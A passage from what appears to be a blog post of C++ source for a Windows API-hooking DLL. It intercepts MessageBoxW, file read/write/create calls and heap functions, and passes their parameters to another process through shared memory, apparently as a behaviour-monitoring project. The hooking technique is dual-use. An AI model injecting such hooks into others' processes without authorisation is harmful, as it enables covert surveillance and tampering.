class="string">&quot;lpCaption(窗口标题)&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info2.Name[<span class="number">3</span>], <span class="string">&quot;utype&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">70</span>];</span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, lpText, <span class="built_in">wcslen</span>(lpText), temp, <span class="built_in"><span class="keyword">sizeof</span></span>(temp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(info2.Value[<span class="number">1</span>], temp);</span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, lpCaption, <span class="built_in">wcslen</span>(lpCaption), temp, <span class="built_in"><span class="keyword">sizeof</span></span>(temp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(info2.Value[<span class="number">2</span>], temp);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(info2.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hwnd);</span><br><span class="line">    <span class="built_in">sprintf</span>(info2.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, utype);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*FILE* f = fopen(&quot;log.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">    fprintf(f, &quot;%s\n&quot;, info2.type);</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; info2.Num; i++)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        fprintf(f, &quot;%s : %s\n&quot;, info2.Name[i], info2.Value[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    fclose(f)*/</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info2, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info2.Num = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldMessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;FBI！！open the door！&quot;</span>, <span class="string">L&quot;已批准逮捕&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">HANDLE</span><span class="params">(WINAPI* OldCreateFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR               lpFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD                 dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD                 dwShareMode,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD                 dwCreationDisposition,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD                 dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE                hTemplateFile</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= CreateFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">HANDLE WINAPI <span class="title">NewCreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR               lpFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD                 dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD                 dwShareMode,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD                 dwCreationDisposition,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD                 dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE                hTemplateFile</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFile = <span class="built_in">OldCreateFile</span>(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);</span><br><span class="line">    info info3;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetFileType</span>(hFile) == FILE_TYPE_DISK) &#123;</span><br><span class="line">        <span class="keyword">char</span> temp[<span class="number">70</span>];</span><br><span class="line">        info3.type = CREATEFILE;</span><br><span class="line">        <span class="built_in">GetLocalTime</span>(&amp;(info3.st));</span><br><span class="line"></span><br><span class="line">        info3.Num = <span class="number">8</span>;</span><br><span class="line">        <span class="comment">// 参数名</span></span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Name[<span class="number">0</span>], <span class="string">&quot;lpFileName&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Name[<span class="number">1</span>], <span class="string">&quot;dwDesiredAccess&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Name[<span class="number">2</span>], <span class="string">&quot;dwShareMode&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Name[<span class="number">3</span>], <span class="string">&quot;lpSecurityAttributes&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Name[<span class="number">4</span>], <span class="string">&quot;dwCreationDisposition&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Name[<span class="number">5</span>], <span class="string">&quot;dwFlagsAndAttributes&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Name[<span class="number">6</span>], <span class="string">&quot;hTemplateFile&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Name[<span class="number">7</span>], <span class="string">&quot;返回文件句柄&quot;</span>);</span><br><span class="line">        <span class="comment">// 参数值</span></span><br><span class="line">        <span class="comment">// 宽字节转char</span></span><br><span class="line">        <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">        <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, lpFileName, <span class="built_in">wcslen</span>(lpFileName), temp, <span class="built_in"><span class="keyword">sizeof</span></span>(temp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(info3.Value[<span class="number">0</span>], temp);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, dwDesiredAccess);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, dwShareMode);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, lpSecurityAttributes);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Value[<span class="number">4</span>], <span class="string">&quot;%08X&quot;</span>, dwCreationDisposition);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Value[<span class="number">5</span>], <span class="string">&quot;%08X&quot;</span>, dwFlagsAndAttributes);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Value[<span class="number">6</span>], <span class="string">&quot;%08X&quot;</span>, hTemplateFile);</span><br><span class="line">        <span class="built_in">sprintf</span>(info3.Value[<span class="number">7</span>], <span class="string">&quot;%08X&quot;</span>, hFile);</span><br><span class="line">        <span class="built_in">memcpy</span>(lpBase, &amp;info3, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hFile;</span><br><span class="line">    <span class="comment">//return OldCreateFile(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI* OldWriteFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE  hFile,<span class="comment">//文件句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPCVOID lpBuffer,<span class="comment">//数据缓存区指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD   nNumberOfBytesToWrite,<span class="comment">//你要写的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesWritten,<span class="comment">//用于保存实际写入字节数的存储区域的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped<span class="comment">//OVERLAPPED结构体指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= WriteFile;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">BOOL WINAPI <span class="title">NewWriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hFile,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nNumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesWritten,<span class="comment">//用于保存实际写入字节数的存储区域的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetFileType</span>(hFile) == FILE_TYPE_DISK)</span><br><span class="line">    &#123;</span><br><span class="line">        info info4;</span><br><span class="line">        info4.type = WRITEFILE;</span><br><span class="line">        info4.Num = <span class="number">5</span>;</span><br><span class="line">        <span class="built_in">GetLocalTime</span>(&amp;(info4.st));</span><br><span class="line">        <span class="comment">//参数名称</span></span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Name[<span class="number">0</span>], <span class="string">&quot;hFile(文件句柄)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Name[<span class="number">1</span>], <span class="string">&quot;lpBuffer(数据缓存区指针)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Name[<span class="number">2</span>], <span class="string">&quot;nNumberOfBytesToWrite(要写的字节数)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Name[<span class="number">3</span>], <span class="string">&quot;lpNumberOfBytesWritten(实际写入字节数存储区域指针)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Name[<span class="number">4</span>], <span class="string">&quot;lpOverlapped&quot;</span>);</span><br><span class="line">        <span class="comment">//参数的键值</span></span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hFile);</span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, lpBuffer);</span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, nNumberOfBytesToWrite);</span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, lpNumberOfBytesWritten);</span><br><span class="line">        <span class="built_in">sprintf</span>(info4.Value[<span class="number">4</span>], <span class="string">&quot;%08X&quot;</span>, lpOverlapped);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(lpBase, &amp;info4, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">        info4.Num = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldWriteFile</span>(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI* OldReadFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hFile,                                    <span class="comment">//文件的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpBuffer,                                <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= ReadFile;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">BOOL WINAPI <span class="title">NewReadFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hFile,                                    <span class="comment">//文件的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpBuffer,                                <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* bool x = true;*/</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetFileType</span>(hFile) == FILE_TYPE_DISK) &#123;</span><br><span class="line">        info info5;</span><br><span class="line">        info5.Num = <span class="number">5</span>;</span><br><span class="line">        info5.type = READFILE;</span><br><span class="line">        <span class="built_in">GetLocalTime</span>(&amp;(info5.st));</span><br><span class="line">        <span class="comment">//截获</span></span><br><span class="line">       <span class="comment">/* char str[100] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">        str = (char*)malloc((nNumberOfBytesToRead + 1) * sizeof(char));</span></span><br><span class="line"><span class="comment">        x = OldReadFile(hFile, str, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);</span></span><br><span class="line"><span class="comment">        str[nNumberOfBytesToRead] = &#x27;\0&#x27;;</span></span><br><span class="line"><span class="comment">        memcpy(lpBuffer,str,sizeof(str));*/</span></span><br><span class="line">        <span class="comment">//参数名称和键值</span></span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Name[<span class="number">0</span>], <span class="string">&quot;hFile(文件句柄)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hFile);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Name[<span class="number">1</span>], <span class="string">&quot;lpBuffer(保存数据缓冲区)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, lpBuffer);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Name[<span class="number">2</span>], <span class="string">&quot;nNumberOfBytesToRead(要读的字节数)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, nNumberOfBytesToRead);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Name[<span class="number">3</span>], <span class="string">&quot;lpNumberOfBytesRead&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, lpNumberOfBytesRead);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Name[<span class="number">4</span>], <span class="string">&quot;lpOverlapped&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info5.Value[<span class="number">4</span>], <span class="string">&quot;%08X&quot;</span>, lpOverlapped);</span><br><span class="line">       <span class="comment">/* sprintf(info5.Name[5], &quot;读取的数据&quot;);</span></span><br><span class="line"><span class="comment">        sprintf(info5.Value[5], &quot;%s&quot;, str);*/</span></span><br><span class="line">        <span class="built_in">memcpy</span>(lpBase, &amp;info5, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">        info5.Num = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*return x;*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldReadFile</span>(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);</span><br><span class="line">   <span class="comment">// return x;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//文件句柄关闭</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI* OldCloseHandle)</span><span class="params">(HANDLE hObject)</span> </span>= CloseHandle;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">BOOL WINAPI <span class="title">NewCloseHandle</span><span class="params">(HANDLE hObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    info info6;</span><br><span class="line">    info6.type = CLOSEHANDLE;</span><br><span class="line">    info6.Num = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info6.st));</span><br><span class="line">    <span class="built_in">sprintf</span>(info6.Name[<span class="number">0</span>], <span class="string">&quot;hObject&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info6.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hObject);</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info6, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info6.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldCloseHandle</span>(hObject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">HANDLE</span><span class="params">(WINAPI* OldHeapCreate)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD  flOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">    SIZE_T dwInitialSize,<span class="comment">//创建堆块的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">    SIZE_T dwMaximumSize</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= HeapCreate;<span class="comment">//返回创建的堆块的句柄</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">HANDLE WINAPI <span class="title">NewHeapCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD  flOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">    SIZE_T dwInitialSize,</span></span></span><br><span class="line"><span class="function"><span class="params">    SIZE_T dwMaximumSize</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">    info info7;</span><br><span class="line">    HANDLE hd = <span class="built_in">OldHeapCreate</span>(flOptions, dwInitialSize, dwMaximumSize);</span><br><span class="line">    heaphandle.<span class="built_in">insert</span>(hd);</span><br><span class="line">    info7.Num = <span class="number">4</span>;</span><br><span class="line">    info7.type = HEAPCREATE;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info7.st));</span><br><span class="line">    <span class="comment">//参数名称和键值以及返回句柄</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info7.Name[<span class="number">0</span>], <span class="string">&quot;flOptions&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info7.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, flOptions);</span><br><span class="line">    <span class="built_in">sprintf</span>(info7.Name[<span class="number">1</span>], <span class="string">&quot;dwInitialSize&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info7.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, dwInitialSize);</span><br><span class="line">    <span class="built_in">sprintf</span>(info7.Name[<span class="number">2</span>], <span class="string">&quot;dwMaximumSize&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info7.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, dwMaximumSize);</span><br><span class="line">    <span class="built_in">sprintf</span>(info7.Name[<span class="number">3</span>], <span class="string">&quot;返回句柄&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info7.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, hd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info7, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info7.Num = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> hd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI* OldHeapDestroy)</span><span class="params">(HANDLE hHeap)</span> </span>= HeapDestroy;<span class="comment">//根据堆块句柄销毁堆块</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">BOOL WINAPI <span class="title">NewHeapDestroy</span><span class="params">(HANDLE hHeap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    heaphandle.<span class="built_in">erase</span>(heaphandle.<span class="built_in">find</span>(hHeap));</span><br><span class="line">    info info8;</span><br><span class="line">    info8.type = HEAPDESTROY;</span><br><span class="line">    info8.Num = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info8.st));</span><br><span class="line">    <span class="comment">//参数</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info8.Name[<span class="number">0</span>], <span class="string">&quot;hHeap(堆句柄)&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info8.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hHeap);</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info8, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info8.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldHeapDestroy</span>(hHeap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI* OldHeapFree)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hHeap,<span class="comment">//堆块句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpMem<span class="comment">//释放的内存块的首地址（指针）</span></span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= HeapFree;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">BOOL WINAPI <span class="title">NewHeapFree</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hHeap,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpMem</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (heaphandle.<span class="built_in">find</span>(hHeap) != heaphandle.<span class="built_in">end</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        info info9;</span><br><span class="line">        info9.Num = <span class="number">3</span>;</span><br><span class="line">        info9.type = HEAPFREE;</span><br><span class="line">        <span class="built_in">GetLocalTime</span>(&amp;(info9.st));</span><br><span class="line">        <span class="comment">//参数</span></span><br><span class="line">        <span class="built_in">sprintf</span>(info9.Name[<span class="number">0</span>], <span class="string">&quot;hHeap(句柄)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info9.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hHeap);</span><br><span class="line">        <span class="built_in">sprintf</span>(info9.Name[<span class="number">1</span>], <span class="string">&quot;dwFlags(堆释放选项)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info9.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, dwFlags);</span><br><span class="line">        <span class="built_in">sprintf</span>(info9.Name[<span class="number">2</span>], <span class="string">&quot;lpMem(要释放的内存块指针)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info9.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, lpMem);</span><br><span class="line">        <span class="keyword">int</span> handle = <span class="built_in">strtoul</span>(info9.Value[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(lpBase, &amp;info9, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//info9.Num = 0;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldHeapFree</span>(hHeap, dwFlags, lpMem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">LPVOID</span><span class="params">(WINAPI* OldHeapAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hHeap,<span class="comment">//堆块句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">    SIZE_T dwBytes<span class="comment">//申请的内存块大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= HeapAlloc;<span class="comment">//返回申请的内存块地址</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function">LPVOID WINAPI <span class="title">NewHeapAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hHeap,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">    SIZE_T dwBytes</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* lpmem = (<span class="keyword">char</span>*)<span class="built_in">OldHeapAlloc</span>(hHeap, dwFlags, dwBytes);</span><br><span class="line">    <span class="keyword">if</span> (heaphandle.<span class="built_in">find</span>(hHeap) != heaphandle.<span class="built_in">end</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        info info10;   </span><br><span class="line">        info10.type = HEAPALLOC;</span><br><span class="line">        info10.Num = <span class="number">4</span>;</span><br><span class="line">        <span class="built_in">GetLocalTime</span>(&amp;(info10.st));</span><br><span class="line">        <span class="comment">//参数</span></span><br><span class="line">        <span class="built_in">sprintf</span>(info10.Name[<span class="number">0</span>], <span class="string">&quot;hHeap(句柄)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info10.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hHeap);</span><br><span class="line">        <span class="built_in">sprintf</span>(info10.Name[<span class="number">1</span>], <span class="string">&quot;dwFlags&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info10.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, dwFlags);</span><br><span class="line">        <span class="built_in">sprintf</span>(info10.Name[<span class="number">2</span>], <span class="string">&quot;dwBytes(分配字节数)&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info10.Value[<span 